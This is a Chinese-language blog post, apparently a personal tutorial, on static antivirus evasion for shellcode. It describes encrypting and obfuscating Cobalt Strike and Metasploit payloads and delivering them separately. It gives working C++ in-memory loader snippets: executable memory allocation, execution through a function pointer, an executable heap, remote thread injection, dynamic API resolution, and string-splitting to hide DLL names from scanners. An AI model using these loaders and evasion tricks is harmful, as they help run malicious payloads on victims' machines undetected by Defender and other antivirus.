---

layout: default

---



# 静态免杀

本文章还在不断完善中，如有错误或建议请不吝指教。

## 杀软查杀方式

其次在做免杀之前，我们必须得了解杀软具体是如何查杀我们的恶意软件的。了解了相应的查杀规则以及方式，我们才能更好的去针对性的绕过以及规避杀软的检测。杀软的大体查杀规则基本是基于文件哈希值（整体哈希/片段哈希等）、字符串特征、API检测、敏感行为检测等这些方面。对于静态检测主要目的是在于绕过对文件哈希字符串导入API等特诊来进行的。

## 针对性处理

个人认为静态免杀可以基于三个维度来做：

1. shellcode生成
2. shellcode传输
3. shellcode执行

### shellcode生成

我们可以针对每个维度来针对性的进行处理。首先就是shellcode的生成，现在流行的渗透框架CS、MSF以及一些知名远控生成的shellcode特征已经是被杀软盯得死死的了，如果不进行修改/加密/混淆等处理，基本就属于见光死，见面就得挨杀。

针对shellcode做处理有大体上有以下几种方式：

1. 直接修改shellcode字节码，加入无效指令/修改shellcode执行逻辑等来修改shellcode的特征码，这种方式属于超出我能力范围之外了，放弃。

2. 对shellcode进行加密混淆处理，常见的如XOR/base64/AES/DES等方式加密shellcode、按照一定规则插入无效字节、字符偏移表等。


### shellcode传输

其次shellcode的传输，也就是shellcode如何到达目标机器，比如直接在代码中硬编码后编译成单文件exe或者dll形式，通过网络协议获取远程shellcode、通过隐写术等方式写入其他文件等方式。相对来说通过网路协议传输或者额外文件中读取（也就是常说的分离免杀）会比单文件形式容易一点。因为上一步会对shellcode做相应的加密混淆等处理，这一步问题不大。

### shellcode执行

接下来就是shellcode的执行了，一般shellcode想要在内存中执行的话需要完成以下步骤：

1. 创建/获取一段可读写执行的内存空间
2. 将shellcode写入这块内存空间
3. 将程序执行的流程指向这块内存空间

shellcode的执行其实说白了也就是shellcode的加载器。最常见的加载器就是通过Windows API来执行：

```c++
VirtualAlloc  //创建一块内存空间并标记为可读写执行
MemeryCopy    //向创建的内存空间中写入自己的shellcode
CreateThread  //将程序执行的流程指向这块内存空间
```

以上3个API组合起来就可以执行我们的shellcode了。但是这几个API基本都是属于敏感API了，基本连defender都过不去了。但是以上3个API可以通过替换等效的其他API函数，比如VirtualAlloc 替换为HeapCreate/HeapAlloc，MemeryCopy替换为memcpy，CreateThread替换成指针等来组合使用：

```c++
//将createThread替换为指针方式执行
LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode),MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(Memory, shellcode, sizeof(shellcode));
((void(*)())Memory)();
//将VirtualAlloc替换成HeapCreate/HeapAlloc
HANDLE HeapHandle = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, sizeof(Shellcode), sizeof(Shellcode));
char * BUFFER = (char*)HeapAlloc(HeapHandle, HEAP_ZERO_MEMORY, sizeof(Shellcode));
memcpy(BUFFER, Shellcode, sizeof(Shellcode));
(*(void(*)())BUFFER)();
//再比如远线程注入的方式
OpenProcess
VirtualAlloc
WriteProcessMemory
CreateRemoteThread
```

由于API基本已经被杀软监控的死死的了，还可以我们可以通过动态调用的方式来调用API执行

```c++
//LoadLibrary/GetProcAddress动态加载VirutalAlloc （其实其他API可以可以通过这种方式去调用）
HINSTANCE K32 = LoadLibrary(TEXT("kernel32.dll"));
MYPROC Allocate = (MYPROC)GetProcAddress(K32, "VirtualAlloc");
char* BUFFER = (char*)Allocate(NULL, sizeof(Shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
memcpy(BUFFER, Shellcode, sizeof(Shellcode));
(*(void(*)())BUFFER)();
//GetModuleHandle/GetProcAddress
MYPROC Allocate = (MYPROC)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc");
char* BUFFER = (char*)Allocate(NULL, sizeof(Shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
memcpy(BUFFER, Shellcode, sizeof(Shellcode));
(*(void(*)())BUFFER)();
```

在上述的代码中，杀软还是可能会将 kernel32.dll VirualAlloc等字符串标记为恶意，我们可以通过字符串的一些小技巧来增加杀软的检测难度，比如：

```c++
//orignal
ntdll = LoadLibrary(TEXT("ntdll"))
//trick
wchar_t ntdll_str[] = {'n','t','d','l','l',0};
ntdll = LoadLibrary(ntdll_str)  
```

虽然通过以上API组合可以实现动态获取相应的API来执行shellcode，但是由于还是导入表中还是暴露了部分API。下面我们就可以通过动态获取相应dll的基址，来动态获取相应API的地址来调用相应的API，从而隐藏导入表中暴露的API：

```c++
//文章中不提供具体的代码，只提供具体思路，按照思路动动手一搜就行了
//代码可以参考《WindowsPE权威指南》的第11章动态加载技术，以及看雪上前辈们的无私贡献出来的代码。
```

以上代码通过动态获取dll基址来动态调用API函数，静态免杀效果不错，



## 参考链接

* [shellcode execution techniques](https://www.contextis.com/en/blog/a-beginners-guide-to-windows-shellcode-execution-techniques)
* [engineering-antivirus-evasion](https://blog.scrt.ch/2020/06/19/engineering-antivirus-evasion/)
* 《WindowsPE权威指南》第11章

[back](../)